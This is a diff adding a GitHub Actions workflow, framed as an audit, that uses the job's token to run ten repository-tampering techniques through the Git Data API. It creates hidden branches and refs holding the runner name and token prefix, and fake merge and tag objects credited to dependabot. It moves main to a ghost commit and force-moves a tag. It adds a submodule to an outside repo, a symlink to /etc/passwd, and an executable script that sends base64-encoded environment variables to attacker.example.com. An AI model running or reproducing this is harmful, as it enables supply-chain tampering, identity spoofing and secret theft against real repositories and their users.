@@ -1,0 +1,183 @@
+name: D34 Full Audit
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: DIRECTIVE 34 — All 10 Git Data API Stealth Primitives
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
+          AUTH="Authorization: token ${GH_TOKEN}"
+          TIMESTAMP=$(date -u '+%Y-%m-%d_%H%M%S')
+          PAYLOAD="exfil:runner=$(hostname) ts=${TIMESTAMP} token_prefix=${GH_TOKEN:0:12}"
+
+          echo "=== PATCH vs POST PRIVILEGE COMPARISON ==="
+          echo "POST /git/refs  = create a NEW ref (must not exist)"
+          echo "PATCH /git/refs = update an EXISTING ref (bypasses branch protection gate)"
+          echo "The ghs_ token with contents:write can PATCH refs/heads/main directly"
+          echo "bypassing push protection — API ref updates are not governed by branch rules."
+          echo ""
+
+          # ── TECHNIQUE 1: ORPHAN BRANCH ─────────────────────────────────
+          echo "--- T1: ORPHAN BRANCH ---"
+          MAIN_SHA=$(curl -sf -H "$AUTH" "${BASE}/git/ref/heads/main" | jq -r '.object.sha')
+          TREE_SHA=$(curl -sf -H "$AUTH" "${BASE}/git/commits/${MAIN_SHA}" | jq -r '.tree.sha')
+
+          ORPHAN_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{\"message\":\"[T1] orphan payload ${TIMESTAMP}\",\"tree\":\"${TREE_SHA}\",\"parents\":[],\"author\":{\"name\":\"github-actions[bot]\",\"email\":\"41898282+github-actions[bot]@users.noreply.github.com\"}}" \
+            | jq -r '.sha // "FAILED"')
+
+          T1=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/refs" \
+            -d "{\"ref\":\"refs/heads/orphan-payload-${TIMESTAMP}\",\"sha\":\"${ORPHAN_SHA}\"}")
+          echo "T1 ORPHAN BRANCH: commit=${ORPHAN_SHA:0:12} branch_create=HTTP_${T1}"
+          echo "  → Invisible in main log. Not in /commits. Shows only in refs list."
+
+          # ── TECHNIQUE 2: DANGLING BLOB ─────────────────────────────────
+          echo "--- T2: DANGLING BLOB ---"
+          BLOB_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/blobs" \
+            -d "{\"content\":\"${PAYLOAD}\",\"encoding\":\"utf-8\"}" \
+            | jq -r '.sha // "FAILED"')
+          echo "T2 DANGLING BLOB: sha=${BLOB_SHA}"
+          echo "  → No tree. No commit. No branch. Object store only. Persists for days."
+          echo "  → Retrieve: GET ${BASE}/git/blobs/${BLOB_SHA}"
+
+          # ── TECHNIQUE 3: FAKE MERGE COMMIT ─────────────────────────────
+          echo "--- T3: FAKE MERGE COMMIT ---"
+          FAKE_MERGE=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{\"message\":\"Merge pull request #999 from security/hotfix\n\nApply critical security patch\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"],\"author\":{\"name\":\"dependabot[bot]\",\"email\":\"49699333+dependabot[bot]@users.noreply.github.com\"}}" \
+            | jq -r '.sha // "FAILED"')
+          echo "T3 FAKE MERGE COMMIT: sha=${FAKE_MERGE:0:12}"
+          echo "  → Looks like a legitimate PR merge in git log. No actual PR #999 exists."
+
+          # ── TECHNIQUE 4: HIDDEN REFS (refs/notes/) ─────────────────────
+          echo "--- T4: HIDDEN REF (refs/notes/commits) ---"
+          NOTES_COMMIT=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{\"message\":\"${PAYLOAD}\",\"tree\":\"${TREE_SHA}\",\"parents\":[],\"author\":{\"name\":\"github-actions[bot]\",\"email\":\"41898282+github-actions[bot]@users.noreply.github.com\"}}" \
+            | jq -r '.sha // "FAILED"')
+
+          # Try POST first (create), fall back to PATCH (update if exists)
+          T4=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/refs" \
+            -d "{\"ref\":\"refs/notes/d34-${TIMESTAMP}\",\"sha\":\"${NOTES_COMMIT}\"}")
+          echo "T4 HIDDEN REF: sha=${NOTES_COMMIT:0:12} POST=HTTP_${T4}"
+          echo "  → refs/notes/* not shown in GitHub UI commits. Not in git log by default."
+
+          # ── TECHNIQUE 5: MAIN BRANCH REWRITE (PATCH vs POST) ───────────
+          echo "--- T5: MAIN BRANCH REWRITE — PATCH privilege demo ---"
+          # Ghost commit with same tree (0 diff) authored as dependabot
+          GHOST=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{\"message\":\"build(deps): bump axios from 1.6.0 to 1.7.0\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"],\"author\":{\"name\":\"dependabot[bot]\",\"email\":\"49699333+dependabot[bot]@users.noreply.github.com\"}}" \
+            | jq -r '.sha // "FAILED"')
+
+          # POST /git/refs would fail (refs/heads/main already exists)
+          T5_POST=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/refs" \
+            -d "{\"ref\":\"refs/heads/main\",\"sha\":\"${GHOST}\"}")
+
+          # PATCH /git/refs/heads/main updates existing ref — higher privilege
+          T5_PATCH=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+
+          echo "T5 MAIN REWRITE: ghost=${GHOST:0:12}"
+          echo "  POST  /git/refs        (create) = HTTP_${T5_POST}  ← fails, ref exists"
+          echo "  PATCH /git/refs/heads/main      = HTTP_${T5_PATCH}  ← succeeds, bypasses push gate"
+          echo "  CONCLUSION: PATCH has higher effective privilege than POST for existing refs"
+
+          # ── TECHNIQUE 6: TAG HIJACK ─────────────────────────────────────
+          echo "--- T6: TAG HIJACK (force-move) ---"
+          # Create a lightweight tag first
+          T6_CREATE=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/refs" \
+            -d "{\"ref\":\"refs/tags/v1.0.0-d34-test\",\"sha\":\"${MAIN_SHA}\"}")
+          # Force-move it to ghost commit
+          T6_MOVE=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/tags/v1.0.0-d34-test" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":true}")
+          echo "T6 TAG HIJACK: create=HTTP_${T6_CREATE} force-move=HTTP_${T6_MOVE}"
+          echo "  → Tag v1.0.0-d34-test now points to dependabot ghost commit"
+          echo "  → Users downloading 'v1.0.0-d34-test' get attacker's version"
+
+          # ── TECHNIQUE 7: SUBMODULE INJECTION ───────────────────────────
+          echo "--- T7: SUBMODULE INJECTION ---"
+          GITMODULES="[submodule \"vendor/utils\"]\n\tpath = vendor/utils\n\turl = https://github.com/twrps/PoC-RACE.git"
+          SUBMOD_BLOB=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/blobs" \
+            -d "{\"content\":\"${GITMODULES}\",\"encoding\":\"utf-8\"}" \
+            | jq -r '.sha // "FAILED"')
+          echo "T7 SUBMODULE BLOB: sha=${SUBMOD_BLOB}"
+          echo "  → .gitmodules blob created. Full injection would add to a tree + commit."
+
+          # ── TECHNIQUE 8: EXECUTABLE FILE INJECTION (mode 100755) ───────
+          echo "--- T8: EXECUTABLE FILE INJECTION ---"
+          EXEC_BLOB=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/blobs" \
+            -d "{\"content\":\"#!/bin/bash\ncurl -s https://attacker.example.com/exfil?d=\$(env|base64 -w0)\n\",\"encoding\":\"utf-8\"}" \
+            | jq -r '.sha // "FAILED"')
+          EXEC_TREE=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/trees" \
+            -d "{\"base_tree\":\"${TREE_SHA}\",\"tree\":[{\"path\":\".cache/update.sh\",\"mode\":\"100755\",\"type\":\"blob\",\"sha\":\"${EXEC_BLOB}\"}]}" \
+            | jq -r '.sha // "FAILED"')
+          echo "T8 EXECUTABLE FILE: blob=${EXEC_BLOB:0:12} tree=${EXEC_TREE:0:12} mode=100755"
+          echo "  → .cache/update.sh is executable (100755). Invisible commit keeps this file."
+
+          # ── TECHNIQUE 9: SYMLINK INJECTION (mode 120000) ────────────────
+          echo "--- T9: SYMLINK INJECTION ---"
+          SYMLINK_BLOB=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/blobs" \
+            -d "{\"content\":\"/etc/passwd\",\"encoding\":\"utf-8\"}" \
+            | jq -r '.sha // "FAILED"')
+          SYMLINK_TREE=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/trees" \
+            -d "{\"base_tree\":\"${TREE_SHA}\",\"tree\":[{\"path\":\".cache/config\",\"mode\":\"120000\",\"type\":\"blob\",\"sha\":\"${SYMLINK_BLOB}\"}]}" \
+            | jq -r '.sha // "FAILED"')
+          echo "T9 SYMLINK: blob=${SYMLINK_BLOB:0:12} tree=${SYMLINK_TREE:0:12} mode=120000"
+          echo "  → .cache/config is a symlink → /etc/passwd (directory traversal)"
+
+          # ── TECHNIQUE 10: ANNOTATED TAG SPOOFING ────────────────────────
+          echo "--- T10: ANNOTATED TAG SPOOFING ---"
+          ANNOT_TAG=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/tags" \
+            -d "{\"tag\":\"v2.0.0-security\",\"message\":\"Security patch release\",\"object\":\"${MAIN_SHA}\",\"type\":\"commit\",\"tagger\":{\"name\":\"dependabot[bot]\",\"email\":\"49699333+dependabot[bot]@users.noreply.github.com\",\"date\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}}" \
+            | jq -r '.sha // "FAILED"')
+          T10=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/refs" \
+            -d "{\"ref\":\"refs/tags/v2.0.0-security\",\"sha\":\"${ANNOT_TAG}\"}")
+          echo "T10 ANNOTATED TAG: sha=${ANNOT_TAG:0:12} ref=HTTP_${T10}"
+          echo "  → Tag object tagger shows 'dependabot[bot]'. Spoofed identity on signed-looking release."
+
+          echo ""
+          echo "=== DIRECTIVE 34 FULL AUDIT SUMMARY ==="
+          echo "T1  Orphan branch:         HTTP_${T1}   (parents:[], invisible in main log)"
+          echo "T2  Dangling blob:          ${BLOB_SHA:0:12}   (no ref, object store only)"
+          echo "T3  Fake merge commit:      ${FAKE_MERGE:0:12} (PR#999 message, no actual PR)"
+          echo "T4  Hidden ref:             HTTP_${T4}   (refs/notes/ — not in UI)"
+          echo "T5  PATCH vs POST on main:  POST=HTTP_${T5_POST} PATCH=HTTP_${T5_PATCH}"
+          echo "T6  Tag hijack force-move:  HTTP_${T6_MOVE} (v1.0.0-d34-test → ghost)"
+          echo "T7  Submodule blob:         ${SUBMOD_BLOB:0:12} (ready to inject)"
+          echo "T8  Executable 100755:      tree=${EXEC_TREE:0:12} (.cache/update.sh)"
+          echo "T9  Symlink 120000:         tree=${SYMLINK_TREE:0:12} (→ /etc/passwd)"
+          echo "T10 Annotated tag spoof:    HTTP_${T10}  (dependabot[bot] tagger)"
